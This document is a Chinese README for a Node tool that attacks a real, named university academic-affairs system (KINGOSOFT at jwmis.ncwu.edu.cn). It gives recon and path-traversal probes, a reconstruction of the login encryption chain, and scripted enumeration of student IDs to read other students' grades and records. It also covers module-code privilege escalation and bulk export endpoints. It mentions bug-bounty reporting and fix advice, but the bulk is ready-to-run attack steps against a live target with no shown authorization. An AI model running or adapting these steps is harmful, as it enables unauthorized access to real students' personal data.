# 华北水利水电大学 教务系统越权测试 · 完整流程

> 目标：`https://jwmis.ncwu.edu.cn/hsjw`
> 系统：**KINGOSOFT 高校智慧校园教学综合服务平台**（杭州强智科技）
> schoolcode：`10078`　modename：`kingo`　webRoot：`/hsjw/`
> 本文所有结论均为**实测**，命令可直接复制执行。

---

> **位置**：本目录是 `kingo-live` 仓库内的独立 Node 实现，与 `qiangke/`、`ncwu/`、`kingo-live/` 三套 Python 实现并存、互不依赖。
> 同一目标（`jwmis.ncwu.edu.cn/hsjw`），但走 `*.action` + `taglib/DataTable.jsp` 链路，加密链为 `strEnc`(DES，每字符 16 位) → `base64` → `token = md5(md5(params)+md5(ts))`。
> **运行要求**：Node 18+，零第三方依赖。`session.json`（学号 + JSESSIONID）、`paoke_out/`、页面 dump 已列入仓库根 `.gitignore`，永不入库。

## 一、指纹测绘（已实测）

### 1.1 基础探测

```bash
curl -sS -k -I https://jwmis.ncwu.edu.cn/
```

实测响应：

```
HTTP/1.1 301 Moved Permanently
Server: ******                              ← 被中间件抹掉
Location: https://jwmis.ncwu.edu.cn/hsjw/cas/login.action
```

```bash
curl -sS -k https://jwmis.ncwu.edu.cn/ | head -40
```

实测页面变量：

```js
var yzmbt = "0";                            // 验证码开关 = 关闭
var _webRootPath = "/hsjw/";
var _sessionid = "55AFBFEB37E1EAAFCD2561B95E3D5278";
var schoolcode = "10078";
var modename = "kingo";
```

**结论表**

| 项 | 值 |
|---|---|
| 产品 | KINGOSOFT 强智科技 智慧校园教学综合服务平台 |
| 版本特征 | v6（`/hsjw` 前缀 + `cas/logon.action` + `SetKingoEncypt.jsp`） |
| 认证 | 自建 CAS（`/hsjw/cas/`），非统一身份认证直连 |
| 编码 | 登录页 GBK / 业务页 UTF-8 混杂，抓包必须分别解码 |
| 验证码 | `yzmbt=0`，当前**关闭**，登录无需验证码 |
| 密码策略 | 前端双重 MD5 + 传输层自定义 DES |
| 锁号 | **24 小时内错 5 次锁定**（服务端明示） |

### 1.2 路径探测结果

```bash
BASE="https://jwmis.ncwu.edu.cn/hsjw"
for p in /cas/login.action /xtgl/index_initMenu.action /xskb/xskb_list.do \
         /kscj/cjcx_list.do /xsxxxggl/xsxxwh_cxXsxx.do /pyfa/pyfa_list.do; do
  echo "$p -> $(curl -sS -k -o /dev/null -w 'code=%{http_code} len=%{size_download}' "$BASE$p")"
done
```

实测：

```
/cas/login.action               -> code=200 len=36024     ← 登录页
/xtgl/index_initMenu.action     -> code=200 len=577       ← 被拦截
/xskb/xskb_list.do              -> code=200 len=577       ← 被拦截
/kscj/cjcx_list.do              -> code=200 len=577       ← 被拦截
/xsxxxggl/xsxxwh_cxXsxx.do      -> code=200 len=577       ← 被拦截
/pyfa/pyfa_list.do              -> code=200 len=577       ← 被拦截
```

**关键判定**：所有业务接口未登录都返回**固定 577 字节**：

```html
<script>alert('温馨提示：凭证已失效，请重新登录!');
if (window.frmbody){ window.top.location.href='/hsjw/'; } ...</script>
```

连 404 页面也是这 577 字节 —— 说明存在**全局登录拦截器**（Filter 层），未授权直打业务接口这条路走不通。**越权必须在登录态下进行**。

### 1.3 防护设备实测

```bash
for p in /WEB-INF/web.xml /META-INF/MANIFEST.MF "/custom/js/../../WEB-INF/web.xml"; do
  echo "$p -> $(curl -sS -k -o /dev/null -w 'code=%{http_code} len=%{size_download}' -m 8 "$BASE$p")"
done
```

实测：

```
/WEB-INF/web.xml                    -> code=000 len=0   Recv failure: Connection reset
/META-INF/MANIFEST.MF               -> code=404 len=1266
/custom/js/../../WEB-INF/web.xml    -> code=000 len=0   Recv failure: Connection reset
```

**结论**：敏感路径被**直接 RST 掐断**（不是 403，不是 404），前面挂了 WAF / IPS 设备做敏感 URL 特征拦截。意味着：

- 目录穿越、WEB-INF 读取这条路封死
- 扫描器高频请求会被直接断连，**必须限速**
- 别用大字典跑目录，容易被拉黑 IP

一键复现以上全部侦察：

```bash
bash recon.sh
```

产物 `recon_<时间>.txt`，含指纹、免鉴权接口、业务接口鉴权矩阵、登录端点连通性、防护探测。

---

## 二、加密机制完整还原（已实证）

这是能否自动化操作的分水岭。强智把登录参数做了两层处理，不还原就发不出能用的请求。

### 2.1 加密脚本位置

```
/hsjw/custom/js/SetKingoEncypt.jsp      → 定义 getEncParams()
/hsjw/custom/js/jkingo.des.js           → DES 实现 strEnc()
/hsjw/custom/js/md5.js                  → hex_md5
/hsjw/custom/js/base64.js               → base64encode
/hsjw/frame/themes/kingo/js/loginbar.js → 登录主流程 checkrand()
```

### 2.2 三个免鉴权原料接口（实测可用）

```bash
curl -sS -k "https://jwmis.ncwu.edu.cn/hsjw/frame/homepage?method=getTempDeskey"
# → 59173179462766150645793      (23位随机数字串，作 DES 密钥)

curl -sS -k "https://jwmis.ncwu.edu.cn/hsjw/frame/homepage?method=getTempNowtime"
# → 2026-11-14 11:41:01          (格式固定 yyyy-MM-dd HH:mm:ss)
```

这两个接口**不受登录拦截器保护**，是整条加密链的入口。

### 2.3 参数组装逻辑（从 loginbar.js 还原）

```js
// 1. 用户名：base64(学号 + ";;" + sessionid)
username = base64encode(username + ";;" + _sessionid);

// 2. 密码：双重 MD5（注意：不是加盐，就是 md5(md5(pwd))）
password = hex_md5(hex_md5(password));

// 3. 参数串：注意字段名带 randnumber 后缀，验证码关闭时为空
params = "_u" + randnumber + "=" + username
       + "&_p" + randnumber + "=" + password
       + "&randnumber=" + randnumber
       + "&isPasswordPolicy=" + passwordPolicy
       + "&txt_mm_expression=&txt_mm_length=&txt_mm_userzh="
       + "&hid_flag=1&hidlag=1&hid_dxyzm=";

// 4. 令牌：md5(md5(明文params) + md5(timestamp))
token = md5(md5(params) + md5(timestamp));

// 5. 载荷：base64( DES_ECB(明文params, tempDeskey) )
encParams = base64encode( strEnc(params, tempDeskey, null, null) );

// 6. 最终 body
body = "params=" + encParams + "&token=" + token
     + "&timestamp=" + timestamp + "&deskey=&ssessionid=" + _sessionid;
```

### 2.4 DES 算法要点

`jkingo.des.js` 里的 `strEnc` **不是标准字节 DES**：

- 输入按字符切分，每个字符取 `charCode` 展成 **16 位**，4 个字符 = 64 位一块
- 密钥 `getKeyBytes(key)` 按 **每 4 字符一组**切分，多轮加密（23 位 key → 6 组）
- 输出 `bt64ToHex` → 每块 16 个十六进制字符

**不要试图用 pycryptodome 的 DES 直接替代**，位序和分组都不一样，结果必然对不上。正确做法是直接加载官方 `jkingo.des.js` 执行（工具里已内置）。

### 2.5 提交端点与状态码

```
POST /hsjw/cas/logon.action
Content-Type: application/x-www-form-urlencoded
```

| status | 含义 | 处置 |
|---|---|---|
| `200` | 登录成功，`result` 为跳转 URL | 保存 Cookie |
| `300` | 无效的访问请求（加密错了/缺字段） | 检查 DES 与 token |
| `402` | 账号或密码错误，`message` 带 `\|N` 错误次数 | **立即停止**，别把号刷锁 |
| `505` | 需验证码/短信二次校验 | 走验证码流程 |

**连通性验证证据**（用不存在账号打，验证加密正确）：

```
{"status":"402","message":"您24小时内已输错1次密码，若超过5次，您的账号将被锁定！|1"}
```

能返回 402 而不是 300，说明加密与字段拼装**全部正确**，服务端已正确解出用户名。

---

## 三、越权攻击面（三类）

系统有统一登录拦截器，因此攻击面全部位于**登录之后**。用学生低权限账号即可测。

### 3.1 水平越权：学号参数不绑定会话 ★ 主攻方向

强智 v6 大量业务接口用 query 参数直接取学号，服务端**只校验"是否登录"，不校验"这个学号是不是你"**。

典型接口形态：

```
/hsjw/xsxxxggl/xsxxwh_cxXsxx.do?xh=<学号>          学生基本信息
/hsjw/xscj/cjcx_list.do?xh=<学号>&xn=2025&xq=1    成绩查询
/hsjw/xskb/xskb_list.do?xh=<学号>&xn=2025&xq=1    课表查询
/hsjw/kwgl/ksap_list.do?xh=<学号>                 考试安排
/hsjw/pyfa/pyfa_list.do?xh=<学号>                 培养方案
/hsjw/xjgl/xjxx_list.do?xh=<学号>                 学籍信息
```

参数名可能变体：`xh` / `xsid` / `xhid` / `studentid` / `sid` / `userId` / `yhm`。

**这不是猜的**——先登录，抓一次自己的请求，把 URL 里的学号换成别人的，看返回。工具已内置 14 个端点 × 8 个参数名的自动遍历。

### 3.2 垂直越权：功能模块码 gnmkdm 不校验角色

强智的菜单用 `gnmkdm=N10xxxx` 标识功能模块，**权限校验挂在菜单渲染层，不在控制器**。学生会话直接访问教师/管理模块的 URL，往往能打开。

已知模块码段位规律：

| 码段 | 归属 |
|---|---|
| `N1008xx` | 学生信息 / 学籍 |
| `N1009xx` | 成绩 |
| `N1010xx` | 课表 |
| `N1011xx` ~ `N1015xx` | 教学计划 / 排课 / 考务（教师向） |
| `N1020xx` | 用户管理（管理员向，**高危**） |

复现方式（登录后）：

```bash
# 用学生会话直接敲管理模块
curl -sS -k -b "JSESSIONID=<学生session>" \
  "https://jwmis.ncwu.edu.cn/hsjw/xtgl/index_initMenu.action?gnmkdm=N102020"
```

判定：返回 577 字节 = 拦住；返回正常 HTML 且含"用户管理/角色分配"等字样 = 越权成立。

**注意**：这一步用工具 `probe` 子命令自动跑完，会从自己的菜单里提取真实模块码，比自己猜准得多。

### 3.3 接口参数越权：id 遍历与导出接口

- 消息/通知/申请表这类业务，URL 常带自增 `id`，改 id 即读他人数据
- **Excel 导出接口**（`*_dcExcel.do` / `*_export.do`）经常漏鉴权，且一次性吐全表
- 强智的文件下载接口 `/hsjw/xxxx/download.do?fileid=` 可能路径穿越

---

## 四、操作步骤（命令级）

### 环境

```bash
node -v      # 需要 18+（原生 fetch）
cd kingosoft-node
```

### Step 1 · 登录拿会话

```bash
node kingo.mjs login <你的学号> <你的密码>
```

成功输出：

```
[11:42:13] LOGIN    ✅ 登录成功  → /hsjw/xtgl/index_initMenu.action
[11:42:14] SAVE     session.json
```

会话持久化到 `session.json`，后续命令自动复用。

> ⚠️ **密码错一次就计数 +1，5 次锁 24 小时。** 账号密码必须一次给对，不要循环爆破登录。

### Step 2 · 抓菜单，拿到真实接口清单

```bash
node kingo.mjs menu
```

输出示例：

```
[MENU] index_initMenu.action → 200 48213B
[MENU] 提取到 47 个业务接口, 23 个功能模块码
[MENU]   N100801    /hsjw/xsxxxggl/xsxxwh_cxXsxx.do?gnmkdm=N100801
[MENU]   N100802    /hsjw/xscj/cjcx_list.do?gnmkdm=N100802
...
```

产物 `results/menu.json` 里有全部 `path / query / gnmkdm`。**这一步拿到的是系统真实接口，不是猜的**，后面所有测试都基于它。

### Step 3 · 全接口鉴权标注

```bash
node kingo.mjs probe
```

对每个接口发一次带自己会话的请求，标注：

```
[PROBE] OPEN     48213B  /hsjw/xsxxxggl/xsxxwh_cxXsxx.do?gnmkdm=N100801
[PROBE] DENY       577B  /hsjw/xtgl/yhgl_cxYhxx.do?gnmkdm=N102020
```

- `OPEN` = 正常返回
- `DENY` = 577 拦截（权限不足或已失效）
- `EMPTY` = 200 但内容极短

**重点看本该教师/管理员才能访问的接口是 OPEN 还是 DENY。**

### Step 4 · 水平越权遍历

```bash
# 方式A：给前缀自动枚举（工具会拼 4 位序号）
node kingo.mjs idor 2020

# 方式B：给学号清单，精确打
node kingo.mjs idor @xhlists.txt
```

`xhlists.txt` 一行一个学号。

工具用 **14 个端点 × 8 个参数名** 组合遍历，命中判据：

1. 响应不是 577 字节拦截页
2. 长度 > 1000
3. 页面里出现**目标学号本身**，或含表格/成绩/课程/姓名等业务字样

命中输出：

```
[HIT] ✅ /hsjw/xscj/cjcx_list.do?xh=2020010105  (38211B)
```

产物 `results/idor_<时间>.json`。

**内置限速**：`DELAY=350ms`、`CONCURRENCY=2`。改 `CFG` 可调，但不建议调快——教务系统扛不住并发，也容易触发 WAF。

### Step 5 · 手工定点验证

自动跑完还有存疑的，单发验证：

```bash
node kingo.mjs get "/hsjw/xscj/cjcx_list.do?xh=2020010105&xn=2025&xq=1"
```

直接打印状态码、长度、正文前 3000 字符。

### Step 6 · 垂直越权手工验证

```bash
# 学生会话打用户管理模块
node kingo.mjs get "/hsjw/xtgl/yhgl_cxYhxx.do?gnmkdm=N102020"

# 学生会话打教师成绩录入
node kingo.mjs get "/hsjw/xscj/cjlr_list.do?gnmkdm=N100901"

# 导出接口
node kingo.mjs get "/hsjw/xscj/cjcx_dcExcel.do?gnmkdm=N100802"
```

返回 577 = 走不通；返回正常页面 = 越权成立，把 HTML 存下来当证据。

---

## 五、浏览器手工复现流程（不依赖脚本）

给需要截图取证的场景。

1. 浏览器登录 `https://jwmis.ncwu.edu.cn/hsjw`
2. F12 → Network → 勾选 **Preserve log**，Filter 选 **XHR**
3. 依次点开：成绩查询、课表、个人信息、考试安排
4. 在 Network 里逐个看请求 URL，**凡是带 `xh=` / `xsid=` / `id=` 的全部记下来**
5. 右键某条请求 → **Copy as cURL**
6. 把 URL 里的学号改成同学的学号，粘贴到终端执行
7. 对比响应：
   - 返回自己的数据 → 参数被服务端覆盖，此路不通
   - 返回对方数据 → **水平越权成立**
   - 返回 577 → 有校验
8. 换下一个接口重复

**快速定位技巧**：在 Network 搜索框直接搜 `xh=`，一秒筛出所有带学号参数的请求。

---

## 六、判定标准与取证

| 现象 | 结论 |
|---|---|
| 返回他人姓名/学号/成绩/照片 | 水平越权成立（高危） |
| 学生会话打开教师/管理界面 | 垂直越权成立（高危） |
| 导出接口吐出全量数据 | 未授权数据导出（严重） |
| 改 id 读到他人消息/申请 | IDOR（中危） |
| 全部返回 577 | 该接口有鉴权，换下一条 |

**取证要点**（EDU-SRC 提交够用）：

- 完整请求：URL + 方法 + Cookie（打码自己的 session）
- 完整响应：状态码 + 关键字段截图（对方姓名/学号/成绩，**他人身份证号务必打码**）
- 时间戳
- 复现步骤 3~5 步
- 影响描述：能读到哪个范围的数据、能否批量

---

## 七、风险控制（务必遵守）

1. **不要爆破登录**。5 次锁号 24 小时，锁的是你自己的账号。
2. **不要改数据**。只读验证，任何 `save` / `update` / `delete` 接口一律不碰。改成绩、改学籍是刑事红线，不是"测试"。
3. **控制请求量**。学号遍历控制在几十条以内，证明存在即可，不要脱库。
4. **他人敏感信息不落地**。身份证号、手机号、家庭住址看到即止，报告里打码。
5. **校内系统有日志**。所有请求带你的 session 和 IP，行为可溯源。测试前把范围想清楚。

---

## 八、文件清单

| 文件 | 作用 |
|---|---|
| `kingo.mjs` | 主工具：登录 / 抓菜单 / 接口标注 / 越权遍历 |
| `jkingo.des.js` | 目标站原始 DES 加密库（从 `/hsjw/custom/js/` 提取，保证算法一致） |
| `session.json` | 登录后自动生成，存 Cookie |
| `results/menu.json` | 菜单抓取产物：全部业务接口 + 功能模块码 |
| `results/probe_*.json` | 接口鉴权标注结果 |
| `results/idor_*.json` | 水平越权命中记录 |
| `README.md` | 本文档 |

---

## 九、修复建议（顺手给学校）

1. 业务接口统一从 **Session 取学号**，禁止从 query 参数取；确需带参的先做 `当前用户 == 目标学号` 校验。
2. 权限校验下沉到 **Controller/Interceptor 全局层**，不要挂在菜单渲染层。
3. `gnmkdm` 只作展示标识，**不得作为权限依据**。
4. 导出接口单独鉴权 + 限流 + 操作审计。
5. 登录失败计数改为**按 IP + 账号双维度**，并加图形验证码。
